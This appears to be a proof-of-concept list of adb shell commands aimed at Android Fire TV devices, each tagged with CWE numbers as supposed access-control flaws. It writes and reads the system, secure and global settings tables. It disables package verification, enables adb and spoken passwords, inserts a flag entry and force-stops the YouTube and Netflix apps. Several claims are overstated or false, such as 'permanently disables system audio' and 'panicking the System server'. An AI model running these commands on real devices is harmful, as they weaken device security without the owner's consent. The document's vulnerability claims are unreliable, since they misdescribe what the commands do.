# CWE 284: Improper Access Control.

settings put global development_settings_enabled 1 # Improper Access Control - GLOBAL table.
settings put secure accessibility_speak_password 1 # Improper Access Control in the SECURE table.
settings put system screen_off_timeout 2103 # Sets how long the screen stays on - SYSTEM table.
settings put system sound_effects_enabled 0 # Permanently disables system audio - SYSTEM table.

# Crashing the YouTube and Netflix apps by panicking the Android System server, using CWE 755 (Improper Handling Of System Disruptions), and CWE 862 (Missing Authorization):
am start -n com.amazon.firetv.youtube/dev.cobalt.app.MainActivity -f 0x14000000 && sleep 2.0 && (logcat -c && am broadcast -a android.intent.action.USER_PRESENT && am force-stop com.amazon.firetv.youtube) && dumpsys window | grep -E 'mCurrentFocus|mFocusedApp'
am start -n com.netflix.ninja/.MainActivity -f 0x14000000 && sleep 2.0 && (logcat -c && am broadcast -a android.intent.action.USER_PRESENT && am force-stop com.netflix.ninja) && dumpsys window | grep -E 'mCurrentFocus|mFocusedApp'

# Reading all SQLite3 database tables using CWE 284:
settings list system
settings list secure
settings list global

# Read the SQLite3 tables in rows, including ID keys:
content query --uri content://settings/system
content query --uri content://settings/secure
content query --uri content://settings/global

# Writing settings to those tables using CWE 284, CWE 862, CWE 200 (Information Disclosure) and CWE 276 (Incorrect Permission Assignment):
content update --uri content://settings/global --bind value:s:0 --where "name='development_settings_enabled'"
content update --uri content://settings/global --bind value:s:1 --where "name='development_settings_enabled'"

content update --uri content://settings/global --bind value:s:1 --where "name='adb_enabled'"
content update --uri content://settings/global --bind value:s:0 --where "name='adb_enabled'"

content update --uri content://settings/global --bind value:s:0 --where "name='wifi_sleep_policy'"
content update --uri content://settings/global --bind value:s:2 --where "name='wifi_sleep_policy'"

content update --uri content://settings/global --bind value:s:0 --where "name='package_verifier_enable'"
content update --uri content://settings/global --bind value:s:1 --where "name='package_verifier_enable'"

content update --uri content://settings/global --bind value:s:1 --where "name='low_power_mode'"
content update --uri content://settings/global --bind value:s:0 --where "name='low_power_mode'"

content insert --uri content://settings/system --bind name:s:poc_flag --bind value:s:1

